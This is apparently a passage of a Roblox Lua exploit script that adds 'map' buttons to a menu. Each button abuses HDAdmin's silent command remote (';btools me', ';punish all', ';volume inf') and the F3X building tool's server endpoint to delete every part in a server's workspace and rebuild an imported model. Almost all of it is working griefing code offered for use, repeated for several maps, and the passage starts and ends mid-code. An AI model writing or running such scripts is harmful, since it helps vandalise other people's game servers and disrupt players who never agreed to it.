print(" Deleting all workspace parts...")

for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") or obj:IsA("UnionOperation") or obj:IsA("Model") then
		task.spawn(function()
			pcall(function() deletePart(obj) end)
		end)
	end
end

-- wait a moment to ensure cleanup is complete
task.wait(3)
print(" Workspace cleared. Starting rebuild...")

-- ===============================
-- IMPORT MODEL TO REBUILD
-- ===============================
local model_id = "910493642" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
if not imported_model then
	warn(" Failed to load model ID: " .. tostring(model_id))
	return
end

imported_model.Parent = Lighting -- stash away

local destination = Workspace
local f3x_name = "Building Tools"

-- auto cleanup imported clone
task.delay(15, function()
	if imported_model then
		imported_model:Destroy()
	end
end)

-- ===============================
-- F3X BUILD FUNCTION
-- ===============================
local function f3xBuildPart(fake_part)
	local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

	local partType =
		fake_part:IsA("WedgePart") and "Wedge"
		or fake_part:IsA("Seat") and "Seat"
		or fake_part:IsA("VehicleSeat") and "VehicleSeat"
		or fake_part:IsA("TrussPart") and "Truss"
		or fake_part:IsA("SpawnLocation") and "Spawn"
		or fake_part.Shape == Enum.PartType.Block and "Normal"
		or fake_part.Shape == Enum.PartType.Ball and "Ball"
		or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

	local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

	-- resize
	sync:InvokeServer("SyncResize", {
		{ Part = created, CFrame = created.CFrame, Size = fake_part.Size }
	})

	-- color & transparency
	sync:InvokeServer("SyncColor", {
		{ Part = created, Color = fake_part.Color, UnionColoring = true }
	})
	sync:InvokeServer("SyncMaterial", {
		{ Part = created, Material = fake_part.Material, Transparency = fake_part.Transparency }
	})

	-- collision
	sync:InvokeServer("SyncCollision", {
		{ Part = created, CanCollide = fake_part.CanCollide }
	})

	-- apply textures / decals / meshes
	for _, tex in ipairs(fake_part:GetChildren()) do
		if tex:IsA("Texture") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Texture" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("Decal") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Decal" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("SpecialMesh") then
			sync:InvokeServer("CreateMeshes", { { Part = created } })
			sync:InvokeServer("SyncMesh", {
				{ Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
			})
		end
	end
end

-- ===============================
-- BUILD ALL MODEL PARTS
-- ===============================
for _, part in ipairs(imported_model:GetDescendants()) do
	if part:IsA("BasePart") then
		task.spawn(function()
			f3xBuildPart(part)
		end)
	end
end

-- ===============================
-- HDAdmin Cleanup Commands
-- ===============================
task.delay(15, function()
	pcall(function()
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";fogcolor black")
		wait(0.2)
		RequestCommand:InvokeServer(";res all")
		wait(0.2)
		RequestCommand:InvokeServer(";r6 all")
	end)
end)

 end
})
MapsAddButton({
    Name = "Raise a floppa",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin Commands (top)
-- ===============================
pcall(function()
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";btools me")
	RequestCommand:InvokeServer(";fogcolor black")
	wait(0.4)
	RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) Detection
-- ===============================
local function getF3X()
	for _, v in ipairs(player.Backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	return nil
end

local f3x = getF3X()
if not f3x then
	warn(" You don't have F3X equipped or in your backpack.")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: safe invoke
local function fastInvoke(args)
	task.spawn(function()
		pcall(function()
			serverendpoint:InvokeServer(unpack(args))
		end)
	end)
end

-- Helper: delete a part
local function deletePart(part)
	fastInvoke({"Remove", {part}})
end

-- ===============================
-- DELETE ALL PARTS (BEFORE BUILD)
-- ===============================
print(" Deleting all workspace parts...")

for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") or obj:IsA("UnionOperation") or obj:IsA("Model") then
		task.spawn(function()
			pcall(function() deletePart(obj) end)
		end)
	end
end

-- wait a moment to ensure cleanup is complete
task.wait(3)
print(" Workspace cleared. Starting rebuild...")

-- ===============================
-- IMPORT MODEL TO REBUILD
-- ===============================
local model_id = "9693505280" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
if not imported_model then
	warn(" Failed to load model ID: " .. tostring(model_id))
	return
end

imported_model.Parent = Lighting -- stash away

local destination = Workspace
local f3x_name = "Building Tools"

-- auto cleanup imported clone
task.delay(15, function()
	if imported_model then
		imported_model:Destroy()
	end
end)

-- ===============================
-- F3X BUILD FUNCTION
-- ===============================
local function f3xBuildPart(fake_part)
	local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

	local partType =
		fake_part:IsA("WedgePart") and "Wedge"
		or fake_part:IsA("Seat") and "Seat"
		or fake_part:IsA("VehicleSeat") and "VehicleSeat"
		or fake_part:IsA("TrussPart") and "Truss"
		or fake_part:IsA("SpawnLocation") and "Spawn"
		or fake_part.Shape == Enum.PartType.Block and "Normal"
		or fake_part.Shape == Enum.PartType.Ball and "Ball"
		or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

	local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

	-- resize
	sync:InvokeServer("SyncResize", {
		{ Part = created, CFrame = created.CFrame, Size = fake_part.Size }
	})

	-- color & transparency
	sync:InvokeServer("SyncColor", {
		{ Part = created, Color = fake_part.Color, UnionColoring = true }
	})
	sync:InvokeServer("SyncMaterial", {
		{ Part = created, Material = fake_part.Material, Transparency = fake_part.Transparency }
	})

	-- collision
	sync:InvokeServer("SyncCollision", {
		{ Part = created, CanCollide = fake_part.CanCollide }
	})

	-- apply textures / decals / meshes
	for _, tex in ipairs(fake_part:GetChildren()) do
		if tex:IsA("Texture") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Texture" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("Decal") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Decal" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("SpecialMesh") then
			sync:InvokeServer("CreateMeshes", { { Part = created } })
			sync:InvokeServer("SyncMesh", {
				{ Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
			})
		end
	end
end

-- ===============================
-- BUILD ALL MODEL PARTS
-- ===============================
for _, part in ipairs(imported_model:GetDescendants()) do
	if part:IsA("BasePart") then
		task.spawn(function()
			f3xBuildPart(part)
		end)
	end
end

print(" Finished rebuilding model:", model_id)

-- ===============================
-- HDAdmin Cleanup Commands
-- ===============================
task.delay(5, function()
	pcall(function()
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";fogcolor black")
		wait(0.2)
		RequestCommand:InvokeServer(";res all")
		wait(0.2)
		RequestCommand:InvokeServer(";r6 all")
	end)
end)

 end
})
MapsAddButton({
    Name = "Epic minigames",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin Commands (top)
-- ===============================
pcall(function()
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";btools me")
	RequestCommand:InvokeServer(";fogcolor black")
	wait(0.4)
	RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) Detection
-- ===============================
local function getF3X()
	for _, v in ipairs(player.Backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	return nil
end

local f3x = getF3X()
if not f3x then
	warn(" You don't have F3X equipped or in your backpack.")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: safe invoke
local function fastInvoke(args)
	task.spawn(function()
		pcall(function()
			serverendpoint:InvokeServer(unpack(args))
		end)
	end)
end

-- Helper: delete a part
local function deletePart(part)
	fastInvoke({"Remove", {part}})
end

-- ===============================
-- DELETE ALL PARTS (BEFORE BUILD)
-- ===============================
print(" Deleting all workspace parts...")

for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") or obj:IsA("UnionOperation") or obj:IsA("Model") then
		task.spawn(function()
			pcall(function() deletePart(obj) end)
		end)
	end
end

-- wait a moment to ensure cleanup is complete
task.wait(3)
print(" Workspace cleared. Starting rebuild...")

-- ===============================
-- IMPORT MODEL TO REBUILD
-- ===============================
local model_id = "1983757113" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
if not imported_model then
	warn(" Failed to load model ID: " .. tostring(model_id))
	return
end

imported_model.Parent = Lighting -- stash away

local destination = Workspace
local f3x_name = "Building Tools"

-- auto cleanup imported clone
task.delay(15, function()
	if imported_model then
		imported_model:Destroy()
	end
end)

-- ===============================
-- F3X BUILD FUNCTION
-- ===============================
local function f3xBuildPart(fake_part)
	local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

	local partType =
		fake_part:IsA("WedgePart") and "Wedge"
		or fake_part:IsA("Seat") and "Seat"
		or fake_part:IsA("VehicleSeat") and "VehicleSeat"
		or fake_part:IsA("TrussPart") and "Truss"
		or fake_part:IsA("SpawnLocation") and "Spawn"
		or fake_part.Shape == Enum.PartType.Block and "Normal"
		or fake_part.Shape == Enum.PartType.Ball and "Ball"
		or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

	local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

	-- resize
	sync:InvokeServer("SyncResize", {
		{ Part = created, CFrame = created.CFrame, Size = fake_part.Size }
	})

	-- color & transparency
	sync:InvokeServer("SyncColor", {
		{ Part = created, Color = fake_part.Color, UnionColoring = true }
	})
	sync:InvokeServer("SyncMaterial", {
		{ Part = created, Material = fake_part.Material, Transparency = fake_part.Transparency }
	})

	-- collision
	sync:InvokeServer("SyncCollision", {
		{ Part = created, CanCollide = fake_part.CanCollide }
	})

	-- apply textures / decals / meshes
	for _, tex in ipairs(fake_part:GetChildren()) do
		if tex:IsA("Texture") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Texture" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("Decal") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Decal" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("SpecialMesh") then
			sync:InvokeServer("CreateMeshes", { { Part = created } })
			sync:InvokeServer("SyncMesh", {
				{ Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
			})
		end
	end
end

-- ===============================
-- BUILD ALL MODEL PARTS
-- ===============================
for _, part in ipairs(imported_model:GetDescendants()) do
	if part:IsA("BasePart") then
		task.spawn(function()
			f3xBuildPart(part)
		end)
	end
end

print(" Finished rebuilding model:", model_id)

-- ===============================
-- HDAdmin Cleanup Commands
-- ===============================
task.delay(15, function()
	pcall(function()
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";fogcolor black")
		wait(0.2)
		RequestCommand:InvokeServer(";res all")
		wait(0.2)
		RequestCommand:InvokeServer(";r6 all")
	end)
end)

 end
})
MapsAddButton({
    Name = "Area 51",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin Commands (top)
-- ===============================
pcall(function()
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";btools me")
	wait(0.4)
	RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) Detection
-- ===============================
local function getF3X()
	for _, v in ipairs(player.Backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	return nil
end

local f3x = getF3X()
if not f3x then
	warn(" You don't have F3X equipped or in your backpack.")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: safe invoke
local function fastInvoke(args)
	task.spawn(function()
		pcall(function()
			serverendpoint:InvokeServer(unpack(args))
		end)
	end)
end

-- Helper: delete a part
local function deletePart(part)
	fastInvoke({"Remove", {part}})
end

-- ===============================
-- DELETE ALL PARTS (BEFORE BUILD)
-- ===============================
print(" Deleting all workspace parts...")

for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") or obj:IsA("UnionOperation") or obj:IsA("Model") then
		task.spawn(function()
			pcall(function() deletePart(obj) end)
		end)
	end
end

-- wait a moment to ensure cleanup is complete
task.wait(3)
print(" Workspace cleared. Starting rebuild...")

-- ===============================
-- IMPORT MODEL TO REBUILD
-- ===============================
local model_id = "18704686298" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
if not imported_model then
	warn(" Failed to load model ID: " .. tostring(model_id))
	return
end

imported_model.Parent = Lighting -- stash away

local destination = Workspace
local f3x_name = "Building Tools"

-- auto cleanup imported clone
task.delay(15, function()
	if imported_model then
		imported_model:Destroy()
	end
end)

-- ===============================
-- F3X BUILD FUNCTION
-- ===============================
local function f3xBuildPart(fake_part)
	local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

	local partType =
		fake_part:IsA("WedgePart") and "Wedge"
		or fake_part:IsA("Seat") and "Seat"
		or fake_part:IsA("VehicleSeat") and "VehicleSeat"
		or fake_part:IsA("TrussPart") and "Truss"
		or fake_part:IsA("SpawnLocation") and "Spawn"
		or fake_part.Shape == Enum.PartType.Block and "Normal"
		or fake_part.Shape == Enum.PartType.Ball and "Ball"
		or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

	local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

	-- resize
	sync:InvokeServer("SyncResize", {
		{ Part = created, CFrame = created.CFrame, Size = fake_part.Size }
	})

	-- color & transparency
	sync:InvokeServer("SyncColor", {
		{ Part = created, Color = fake_part.Color, UnionColoring = true }
	})
	sync:InvokeServer("SyncMaterial", {
		{ Part = created, Material = fake_part.Material, Transparency = fake_part.Transparency }
	})

	-- collision
	sync:InvokeServer("SyncCollision", {
		{ Part = created, CanCollide = fake_part.CanCollide }
	})

	-- apply textures / decals / meshes
	for _, tex in ipairs(fake_part:GetChildren()) do
		if tex:IsA("Texture") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Texture" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("Decal") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Decal" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("SpecialMesh") then
			sync:InvokeServer("CreateMeshes", { { Part = created } })
			sync:InvokeServer("SyncMesh", {
				{ Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
			})
		end
	end
end

-- ===============================
-- BUILD ALL MODEL PARTS
-- ===============================
for _, part in ipairs(imported_model:GetDescendants()) do
	if part:IsA("BasePart") then
		task.spawn(function()
			f3xBuildPart(part)
		end)
	end
end

print(" Finished rebuilding model:", model_id)

-- ===============================
-- HDAdmin Cleanup Commands
-- ===============================
task.delay(15, function()
	pcall(function()
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";res all")
		wait(0.2)
		RequestCommand:InvokeServer(";r6 all")
wait(1.5)
RequestCommand:InvokeServer(";music 13061809 ;pitch 0.1 ;volume inf")
	end)
end)

 end
})
MapsAddButton({
    Name = "Slap Tower",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin Commands (top)
-- ===============================
pcall(function()
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";btools me")
	wait(0.4)
	RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) Detection
-- ===============================
local function getF3X()
	for _, v in ipairs(player.Backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	return nil
end

local f3x = getF3X()
if not f3x then
	warn(" You don't have F3X equipped or in your backpack.")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: safe invoke
local function fastInvoke(args)
	task.spawn(function()
		pcall(function()
			serverendpoint:InvokeServer(unpack(args))
		end)
	end)
end

-- Helper: delete a part
local function deletePart(part)
	fastInvoke({"Remove", {part}})
end

-- ===============================
-- DELETE ALL PARTS (BEFORE BUILD)
-- ===============================
print(" Deleting all workspace parts...")

for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") or obj:IsA("UnionOperation") or obj:IsA("Model") then
		task.spawn(function()
			pcall(function() deletePart(obj) end)
		end)
	end
end

-- wait a moment to ensure cleanup is complete
task.wait(3)
print(" Workspace cleared. Starting rebuild...")

-- ===============================
-- IMPORT MODEL TO REBUILD
-- ===============================
local model_id = "80581987717385" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
if not imported_model then
	warn(" Failed to load model ID: " .. tostring(model_id))
	return
end

imported_model.Parent = Lighting -- stash away

local destination = Workspace
local f3x_name = "Building Tools"

-- auto cleanup imported clone
task.delay(15, function()
	if imported_model then
		imported_model:Destroy()
	end
end)

-- ===============================
-- F3X BUILD FUNCTION
-- ===============================
local function f3xBuildPart(fake_part)
	local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

	local partType =
		fake_part:IsA("WedgePart") and "Wedge"
		or fake_part:IsA("Seat") and "Seat"
		or fake_part:IsA("VehicleSeat") and "VehicleSeat"
		or fake_part:IsA("TrussPart") and "Truss"
		or fake_part:IsA("SpawnLocation") and "Spawn"
		or fake_part.Shape == Enum.PartType.Block and "Normal"
		or fake_part.Shape == Enum.PartType.Ball and "Ball"
		or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

	local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

	-- resize
	sync:InvokeServer("SyncResize", {
		{ Part = created, CFrame = created.CFrame, Size = fake_part.Size }
	})

	-- color & transparency
	sync:InvokeServer("SyncColor", {
		{ Part = created, Color = fake_part.Color, UnionColoring = true }
	})
	sync:InvokeServer("SyncMaterial", {
		{ Part = created, Material = fake_part.Material, Transparency = fake_part.Transparency }
	})

	-- collision
	sync:InvokeServer("SyncCollision", {
		{ Part = created, CanCollide = fake_part.CanCollide }
	})

	-- apply textures / decals / meshes
	for _, tex in ipairs(fake_part:GetChildren()) do
		if tex:IsA("Texture") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Texture" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("Decal") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Decal" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("SpecialMesh") then
			sync:InvokeServer("CreateMeshes", { { Part = created } })
			sync:InvokeServer("SyncMesh", {
				{ Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
			})
		end
	end
end

-- ===============================
-- BUILD ALL MODEL PARTS
-- ===============================
for _, part in ipairs(imported_model:GetDescendants()) do
	if part:IsA("BasePart") then
		task.spawn(function()
			f3xBuildPart(part)
		end)
	end
end

print(" Finished rebuilding model:", model_id)

-- ===============================
-- HDAdmin Cleanup Commands
-- ===============================
task.delay(7, function()
	pcall(function()
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";res all")
	end)
end)

 end
})
MapsAddButton({
    Name = "Redwood prison",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin Commands (top)
-- ===============================
pcall(function()
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";btools me")
	wait(0.4)
	RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) Detection
-- ===============================
local function getF3X()
	for _, v in ipairs(player.Backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	return nil
end

local f3x = getF3X()
if not f3x then
	warn(" You don't have F3X equipped or in your backpack.")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: safe invoke
local function fastInvoke(args)
	task.spawn(function()
		pcall(function()
			serverendpoint:InvokeServer(unpack(args))
		end)
	end)
end

-- Helper: delete a part
local function deletePart(part)
	fastInvoke({"Remove", {part}})
end

-- ===============================
-- DELETE ALL PARTS (BEFORE BUILD)
-- ===============================
print("?? Deleting all workspace parts...")

for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") or obj:IsA("UnionOperation") or obj:IsA("Model") then
		task.spawn(function()
			pcall(function() deletePart(obj) end)
		end)
	end
end

-- wait a moment to ensure cleanup is complete
task.wait(3)
print(" Workspace cleared. Starting rebuild...")

-- ===============================
-- IMPORT MODEL TO REBUILD
-- ===============================
local model_id = "2677843736" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
if not imported_model then
	warn(" Failed to load model ID: " .. tostring(model_id))
	return
end

imported_model.Parent = Lighting -- stash away

local destination = Workspace
local f3x_name = "Building Tools"

-- auto cleanup imported clone
task.delay(15, function()
	if imported_model then
		imported_model:Destroy()
	end
end)

-- ===============================
-- F3X BUILD FUNCTION
-- ===============================
local function f3xBuildPart(fake_part)
	local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

	local partType =
		fake_part:IsA("WedgePart") and "Wedge"
		or fake_part:IsA("Seat") and "Seat"
		or fake_part:IsA("VehicleSeat") and "VehicleSeat"
		or fake_part:IsA("TrussPart") and "Truss"
		or fake_part:IsA("SpawnLocation") and "Spawn"
		or fake_part.Shape == Enum.PartType.Block and "Normal"
		or fake_part.Shape == Enum.PartType.Ball and "Ball"
		or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

	local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

	-- resize
	sync:InvokeServer("SyncResize", {
		{ Part = created, CFrame = created.CFrame, Size = fake_part.Size }
	})

	-- color & transparency
	sync:InvokeServer("SyncColor", {
		{ Part = created, Color = fake_part.Color, UnionColoring = true }
	})
	sync:InvokeServer("SyncMaterial", {
		{ Part = created, Material = fake_part.Material, Transparency = fake_part.Transparency }
	})

	-- collision
	sync:InvokeServer("SyncCollision", {
		{ Part = created, CanCollide = fake_part.CanCollide }
	})

	-- apply textures / decals / meshes
	for _, tex in ipairs(fake_part:GetChildren()) do
		if tex:IsA("Texture") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Texture" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("Decal") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Decal" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("SpecialMesh") then
			sync:InvokeServer("CreateMeshes", { { Part = created } })
			sync:InvokeServer("SyncMesh", {
				{ Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
			})
		end
	end
end

-- ===============================
-- BUILD ALL MODEL PARTS
-- ===============================
for _, part in ipairs(imported_model:GetDescendants()) do
	if part:IsA("BasePart") then
		task.spawn(function()
			f3xBuildPart(part)
		end)
	end
end

print(" Finished rebuilding model:", model_id)

-- ===============================
-- HDAdmin Cleanup Commands
-- ===============================
task.delay(12, function()
	pcall(function()
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";res all")
	end)
end)

 end
})
MapsAddButton({
    Name = "Prison Life",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin Commands (top)
-- ===============================
pcall(function()
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";btools me")
	wait(0.4)
	RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) Detection
-- ===============================
local function getF3X()
	for _, v in ipairs(player.Backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	return nil
end

local f3x = getF3X()
if not f3x then
	warn("You don't have F3X skid")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: safe invoke
local function fastInvoke(args)
	task.spawn(function()
		pcall(function()
			serverendpoint:InvokeServer(unpack(args))
		end)
	end)
end

-- Helper: delete a part
local function deletePart(part)
	fastInvoke({"Remove", {part}})
end

-- ===============================
-- DELETE ALL PARTS (BEFORE BUILD)
-- ===============================

for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") or obj:IsA("UnionOperation") or obj:IsA("Model") then
		task.spawn(function()
			pcall(function() deletePart(obj) end)
		end)
	end
end

-- wait a moment to ensure cleanup is complete
task.wait(3)

-- ===============================
-- IMPORT MODEL TO REBUILD
-- ===============================
local model_id = "2065249679" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
if not imported_model then
	warn(" Failed to load model ID: " .. tostring(model_id))
	return
end

imported_model.Parent = Lighting -- stash away

local destination = Workspace
local f3x_name = "Building Tools"

-- auto cleanup imported clone
task.delay(15, function()
	if imported_model then
		imported_model:Destroy()
	end
end)

-- ===============================
